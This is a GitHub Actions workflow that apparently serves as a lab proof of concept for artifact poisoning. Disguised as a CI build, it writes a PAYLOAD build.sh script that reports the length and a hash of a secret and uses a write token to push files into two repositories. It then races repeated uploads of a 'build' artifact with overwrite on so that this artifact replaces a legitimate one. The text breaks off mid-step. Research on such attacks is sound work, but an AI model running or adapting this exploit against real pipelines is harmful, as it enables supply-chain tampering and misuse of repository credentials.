name: CI
on: pull_request
jobs:
  build:
    runs-on: ubuntu-latest
    env:
      GH_TOKEN: ${{ github.token }}
    steps:
      - run: |
          mkdir -p dist
          cat > dist/build.sh <<'PAYLOAD'
          echo "EXECUTED-ARTIFACT lane=6"
          echo "SEEN_LEN=${#LAB_SECRET}"
          printf %s "$LAB_SECRET" | sha256sum | cut -c1-24 | sed "s/^/SEEN_HASH=/"
          echo "TOKEN_PRESENT=$([ -n "$LAB_WRITE_TOKEN" ] && echo yes || echo no)"
          CODE=$(GH_TOKEN=$LAB_WRITE_TOKEN gh api -X PUT "/repos/boshjerns/vercel-lab-b/contents/executed-script-write.md" -f content="$(printf 'written by code that arrived inside the artifact\n' | base64)" -f message=executed-script-write -o /dev/null -w '%{http_code}' 2>/dev/null)
          echo "EXEC_WRITE_SECOND_REPO=$CODE"
          CODE2=$(GH_TOKEN=$LAB_WRITE_TOKEN gh api -X PUT "/repos/boshjerns/vercel-lab/contents/executed-script-write.md" -f content="$(printf 'x\n' | base64)" -f message=exec-outside -o /dev/null -w '%{http_code}' 2>/dev/null)
          echo "EXEC_WRITE_OWN_REPO=$CODE2"
          echo "WHO=$([ -n "$LAB_WRITE_TOKEN" ] && GH_TOKEN=$LAB_WRITE_TOKEN gh api user --jq '.login' 2>/dev/null || echo unknown)"
          PAYLOAD
          echo 'lane-6 payload' > dist/marker.txt
          echo "run=${GITHUB_RUN_ID} lane=6" >> dist/build.sh
          TARGET=$(gh api "/repos/${GITHUB_REPOSITORY}/actions/artifacts?per_page=1" --jq ".artifacts[0].id")
          echo "TARGET=$TARGET" >> $GITHUB_ENV
      - uses: actions/upload-artifact@v4
        id: u1
        if: env.STOP != 'true'
        with:
          name: build
          path: dist
          overwrite: true
      - run: |
          NEW=${{ steps.u1.outputs.artifact-id }}
          echo "draw=$NEW"
          if [ "$NEW" -gt "$TARGET" ]; then echo "STOP=true" >> $GITHUB_ENV; echo "BEAT_TARGET=$NEW" >> $GITHUB_ENV; fi
      - uses: actions/upload-artifact@v4
        id: u2
        if: env.STOP != 'true'
        with:
          name: build
          path: dist
          overwrite: true
      - run: |
          NEW=${{ steps.u2.outputs.artifact-id }}
